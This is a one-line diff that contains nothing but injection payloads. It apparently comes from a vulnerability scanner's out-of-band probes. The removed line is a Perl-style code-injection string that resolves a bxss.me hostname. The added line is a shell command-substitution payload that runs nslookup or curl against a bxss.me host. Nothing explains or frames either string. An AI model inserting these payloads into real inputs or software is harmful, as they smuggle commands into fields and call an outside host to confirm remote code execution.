@@ -1,1 +1,1 @@
-gethostbyname(lc('hittn'.'tjxkasffdd664.bxss.me.')).'A'.chr(67).chr(hex('58')).chr(112).chr(76).chr(102).chr(81)
+$(nslookup -q=cname hitrvvotjysay91f73.bxss.me||curl hitrvvotjysay91f73.bxss.me)
